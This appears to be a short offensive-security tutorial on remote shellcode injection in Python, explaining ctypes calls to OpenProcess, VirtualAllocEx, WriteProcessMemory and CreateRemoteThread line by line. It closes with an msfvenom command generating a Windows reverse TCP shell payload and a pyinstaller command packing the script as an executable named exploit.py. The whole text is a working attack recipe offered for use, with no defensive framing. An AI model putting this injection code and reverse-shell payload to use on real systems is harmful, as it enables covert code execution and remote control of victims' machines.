Remote Shellcode Injection Steps/explanation:

    OpenProcess – This is called to get a handle into the process we want to inject shellcode into
    VirtualAllocEx – This is called to allocate memory for the shellcode in the remote process
    WriteProcessMemory – This writes the shellcode to the allocated memory within the remote process
    CreateRemoteThread – This creates a thread, and executes the shellcode within the remote process
from ctypes import * – The ctypes import is required and is what allows us to interact with the Windows API within python.

page_rwx_value – This is a variable that sets the section of memory that will store the shellcode as read, write, and executable.

processall_variable – This variable states that when we try to open a handle into the process we’re injecting into, we want to have “all possible access rights” into the process.

memcommit –  This variable is set to allocate memory and ensure it is zeroed upon writing to memory.

kernel32_variable – This just stores the available calls from windll.kernel32 within a single variable.

Shellcode – This is the shellcode that will be injected into memory and executed

process_id – This is the process ID that the shellcode will be injected into

shellcode_length – This variable stores the length of the shellcode that will be injected and executed

process_handle = kernel32_variable.OpenProcess(process_all, False, process_id)  – This line makes a call to OpenProcess.  The point of this line is to return a handle into the process we are injecting shellcode into.  We’re specifically asking for all possible process rights, stating that we don’t need to inherit the handle, and specifying the process ID of the process to obtain a handle from.

memory_allocation_variable = kernel32_variable.VirtualAllocEx(process_handle, 0, shellcode_length, memcommit, page_rwx_value) – This line calls VirtualAllocEx, a function that allocates memory in a remote process.  It requires a handle to the process that will have memory allocated (obtained from the OpenProcess call), the size that should be allocated (shellcode length), the type of memory allocation that should be performed (memcommit), and the memory protection that should be placed on the allocated memory range (read, write, execute).  It returns the base address to the memory that was allocated by the function.

kernel32_variable.WriteProcessMemory(process_handle, memory_allocation_variable, shellcode, shellcode_length, 0) – This line calls WriteProcessMemory which writes data (shellcode) to an area of memory within a process of our choosing.  The function receives the process handle that was obtained, the base address where the function will write memory to, our shellcode, and the length of the shellcode, and the value 0 which tells the function to ignore an optional output.

kernel32_variable.CreateRemoteThread(process_handle, None, 0, memory_allocation_variable, 0, 0, 0) – This calls CreateRemoteThread, which will create a thread (go figure) within the another process.  This function call takes in a handle to the process which the shellcode is being injected into, None – states that the thread inherits a default security descriptor, 0 – defines the stack size to be the default size for that executable, the base address of the memory allocated earlier, and the final “0”s are miscellaneous parameters that tells the function that we aren’t providing “A pointer to the application-defined function” (source: MSDN), there isn’t a variable passed in, and to execute the thread immediately

From this point on, the shellcode should execute within the targeted process, and you should be set! 



//
GENERATING SHELLCODE
//

msfvenom -p windows/shell_reverse_tcp lhost=<> lport=<> EXITFUNC=thread -f c -b "\x00"

//
To now convert .py into exe use pyinstaller if you are on linux and py2exe if you are windows based
//

pyinstaller --onefile exploit.py
